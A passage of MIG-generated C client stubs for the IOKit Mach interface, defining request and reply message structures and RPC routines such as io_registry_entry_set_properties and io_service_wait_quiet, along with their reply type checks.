#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t root;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t root;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_registry_get_root_entry_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_registry_get_root_entry_t__defined */

	__DeclareSendRpc(2827, "io_registry_get_root_entry")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = master_port;
	InP->Head.msgh_id = 2827;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2827, "io_registry_get_root_entry")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2827, "io_registry_get_root_entry")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_registry_get_root_entry_t__defined)
	check_result = __MIG_check__Reply__io_registry_get_root_entry_t((__Reply__io_registry_get_root_entry_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_registry_get_root_entry_t__defined) */

	*root = Out0P->root.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_registry_entry_set_properties_t__defined)
#define __MIG_check__Reply__io_registry_entry_set_properties_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_registry_entry_set_properties_t(__Reply__io_registry_entry_set_properties_t *Out0P)
{

	typedef __Reply__io_registry_entry_set_properties_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2928) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_registry_entry_set_properties_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_registry_entry_set_properties */
mig_external kern_return_t io_registry_entry_set_properties
(
	mach_port_t registry_entry,
	io_buf_ptr_t properties,
	mach_msg_type_number_t propertiesCnt,
	kern_return_t *result
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t propertiesCnt;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		kern_return_t result;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		kern_return_t result;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_registry_entry_set_properties_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_registry_entry_set_properties_t__defined */

	__DeclareSendRpc(2828, "io_registry_entry_set_properties")

#if	UseStaticTemplates
	const static mach_msg_ool_descriptor_t propertiesTemplate = {
		/* addr = */		(void *)0,
		/* size = */		0,
		/* deal = */		FALSE,
		/* copy = */		MACH_MSG_PHYSICAL_COPY,
		/* pad2 = */		0,
		/* type = */		MACH_MSG_OOL_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->properties = propertiesTemplate;
	InP->properties.address = (void *)(properties);
	InP->properties.size = propertiesCnt;
#else	/* UseStaticTemplates */
	InP->properties.address = (void *)(properties);
	InP->properties.size = propertiesCnt;
	InP->properties.deallocate =  FALSE;
	InP->properties.copy = MACH_MSG_PHYSICAL_COPY;
	InP->properties.type = MACH_MSG_OOL_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->propertiesCnt = propertiesCnt;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = registry_entry;
	InP->Head.msgh_id = 2828;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2828, "io_registry_entry_set_properties")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2828, "io_registry_entry_set_properties")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_registry_entry_set_properties_t__defined)
	check_result = __MIG_check__Reply__io_registry_entry_set_properties_t((__Reply__io_registry_entry_set_properties_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_registry_entry_set_properties_t__defined) */

	*result = Out0P->result;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_registry_entry_in_plane_t__defined)
#define __MIG_check__Reply__io_registry_entry_in_plane_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_registry_entry_in_plane_t(__Reply__io_registry_entry_in_plane_t *Out0P)
{

	typedef __Reply__io_registry_entry_in_plane_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2929) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_registry_entry_in_plane_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_registry_entry_in_plane */
mig_external kern_return_t io_registry_entry_in_plane
(
	mach_port_t registry_entry,
	io_name_t plane,
	boolean_t *inPlane
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t planeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t planeCnt;
		char plane[128];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		boolean_t inPlane;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		boolean_t inPlane;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__io_registry_entry_in_plane_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_registry_entry_in_plane_t__defined */

	__DeclareSendRpc(2829, "io_registry_entry_in_plane")

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->planeCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->plane, plane, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->planeCnt = (mach_msg_type_number_t) mig_strncpy(InP->plane, plane, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->planeOffset = 0;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 128) + (_WALIGN_(InP->planeCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = registry_entry;
	InP->Head.msgh_id = 2829;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2829, "io_registry_entry_in_plane")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2829, "io_registry_entry_in_plane")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_registry_entry_in_plane_t__defined)
	check_result = __MIG_check__Reply__io_registry_entry_in_plane_t((__Reply__io_registry_entry_in_plane_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_registry_entry_in_plane_t__defined) */

	*inPlane = Out0P->inPlane;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_object_get_retain_count_t__defined)
#define __MIG_check__Reply__io_object_get_retain_count_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_object_get_retain_count_t(__Reply__io_object_get_retain_count_t *Out0P)
{

	typedef __Reply__io_object_get_retain_count_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2930) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_object_get_retain_count_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_object_get_retain_count */
mig_external kern_return_t io_object_get_retain_count
(
	mach_port_t object,
	uint32_t *retainCount
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint32_t retainCount;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint32_t retainCount;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_object_get_retain_count_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_object_get_retain_count_t__defined */

	__DeclareSendRpc(2830, "io_object_get_retain_count")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = object;
	InP->Head.msgh_id = 2830;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2830, "io_object_get_retain_count")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2830, "io_object_get_retain_count")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_object_get_retain_count_t__defined)
	check_result = __MIG_check__Reply__io_object_get_retain_count_t((__Reply__io_object_get_retain_count_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_object_get_retain_count_t__defined) */

	*retainCount = Out0P->retainCount;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_service_get_busy_state_t__defined)
#define __MIG_check__Reply__io_service_get_busy_state_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_service_get_busy_state_t(__Reply__io_service_get_busy_state_t *Out0P)
{

	typedef __Reply__io_service_get_busy_state_t __Reply __attribute__((unused));
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2931) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_service_get_busy_state_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_service_get_busy_state */
mig_external kern_return_t io_service_get_busy_state
(
	mach_port_t service,
	uint32_t *busyState
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint32_t busyState;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		uint32_t busyState;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_service_get_busy_state_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_service_get_busy_state_t__defined */

	__DeclareSendRpc(2831, "io_service_get_busy_state")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = service;
	InP->Head.msgh_id = 2831;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2831, "io_service_get_busy_state")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2831, "io_service_get_busy_state")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_service_get_busy_state_t__defined)
	check_result = __MIG_check__Reply__io_service_get_busy_state_t((__Reply__io_service_get_busy_state_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_service_get_busy_state_t__defined) */

	*busyState = Out0P->busyState;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_service_wait_quiet_t__defined)
#define __MIG_check__Reply__io_service_wait_quiet_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_service_wait_quiet_t(__Reply__io_service_wait_quiet_t *Out0P)
{

	typedef __Reply__io_service_wait_quiet_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 2932) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__io_service_wait_quiet_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_service_wait_quiet */
mig_external kern_return_t io_service_wait_quiet
(
	mach_port_t service,
	mach_timespec_t wait_time
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_timespec_t wait_time;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_service_wait_quiet_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_service_wait_quiet_t__defined */

	__DeclareSendRpc(2832, "io_service_wait_quiet")

	InP->NDR = NDR_record;

	InP->wait_time = wait_time;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = service;
	InP->Head.msgh_id = 2832;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2832, "io_service_wait_quiet")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2832, "io_service_wait_quiet")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_service_wait_quiet_t__defined)
	check_result = __MIG_check__Reply__io_service_wait_quiet_t((__Reply__io_service_wait_quiet_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_service_wait_quiet_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_registry_entry_create_iterator_t__defined)
#define __MIG_check__Reply__io_registry_entry_create_iterator_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_registry_entry_create_iterator_t(__Reply__io_registry_entry_create_iterator_t *Out0P)
{

	typedef __Reply__io_registry_entry_create_iterator_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2933) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->iterator.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->iterator.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_registry_entry_create_iterator_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_registry_entry_create_iterator */
mig_external kern_return_t io_registry_entry_create_iterator
(
	mach_port_t registry_entry,
	io_name_t plane,
	uint32_t options,
	mach_port_t *iterator
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
